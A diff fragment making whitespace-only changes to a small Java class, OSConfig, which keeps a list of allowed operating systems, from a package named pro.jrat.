@@ -5,23 +5,22 @@ import java.util.List;
 
 import pro.jrat.common.OperatingSystem;
 
-
 public final class OSConfig {
 
 	private final List<OperatingSystem> osList = new ArrayList<OperatingSystem>();
-	
+
 	public boolean isAllowed(OperatingSystem os) {
 		return this.osList.indexOf(os) >= 0;
 	}
-	
+
 	public void addOS(OperatingSystem os) {
 		this.osList.add(os);
 	}
-	
+
 	public int size() {
 		return this.osList.size();
 	}
-	
+
 	public static final String generateString(OSConfig c) {
 		String str = "";
 
@@ -46,5 +45,5 @@ public final class OSConfig {
 
 		return str.trim();
 	}
-	
+
 }
